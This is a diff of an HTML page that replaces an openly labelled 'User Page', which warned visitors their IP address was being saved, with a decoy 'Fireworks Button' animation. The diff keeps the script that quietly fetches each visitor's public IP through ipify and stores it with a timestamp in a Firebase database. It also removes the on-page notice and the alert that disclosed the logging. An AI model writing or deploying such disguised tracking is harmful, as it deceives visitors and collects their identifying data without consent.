@@ -1,16 +1,84 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>User Page</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fireworks Button</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: black;
+            overflow: hidden;
+        }
+        button {
+            padding: 15px 30px;
+            font-size: 24px;
+            color: white;
+            background-color: #ff5733;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            z-index: 10;
+        }
+        .firework {
+            position: absolute;
+            border-radius: 50%;
+            opacity: 0;
+            pointer-events: none;
+        }
+    </style>
 </head>
 <body>
 
-  <h1>User Page</h1>
-  <p>Your IP Address is being saved...</p>
-  
-  <!-- Firebase SDK -->
+<button id="fireworkButton">Click Me!</button>
+
+<script>
+    document.getElementById("fireworkButton").onclick = function() {
+        createFireworks();
+    };
+
+    function createFireworks() {
+        const colors = ["#ff0000", "#00ff00", "#0000ff", "#ffff00", "#ff00ff", "#00ffff"];
+        const numFireworks = 20;
+
+        for (let i = 0; i < numFireworks; i++) {
+            createFirework(colors[Math.floor(Math.random() * colors.length)]);
+        }
+    }
+
+    function createFirework(color) {
+        const firework = document.createElement("div");
+        firework.className = "firework";
+        firework.style.backgroundColor = color;
+
+        document.body.appendChild(firework);
+
+        const x = Math.random() * window.innerWidth;
+        const y = Math.random() * window.innerHeight;
+
+        firework.style.width = "10px";
+        firework.style.height = "10px";
+        firework.style.left = `${x}px`;
+        firework.style.top = `${y}px`;
+
+        firework.animate([
+            { transform: 'scale(1)', opacity: 1 },
+            { transform: 'scale(4)', opacity: 0 }
+        ], {
+            duration: 1000,
+            easing: "ease-out",
+            fill: "forwards"
+        });
+
+        setTimeout(() => {
+            document.body.removeChild(firework);
+        }, 1000);
+    }
+</script>
   <script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-app.js"></script>
   <script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-database.js"></script>
   
@@ -33,7 +101,6 @@
     function saveIpToFirebase(ip) {
       const timestamp = new Date().toISOString();
       firebase.database().ref('userIPs').push({ ip: ip, timestamp: timestamp });
-      alert('Your IP address (' + ip + ') has been saved!');
     }
 
     // Fetch the user's public IP address using ipify API
@@ -42,7 +109,6 @@
       .then(data => {
         saveIpToFirebase(data.ip);
       })
-      .catch(error => console.error('Error fetching IP address:', error));
   </script>
 
 </body>
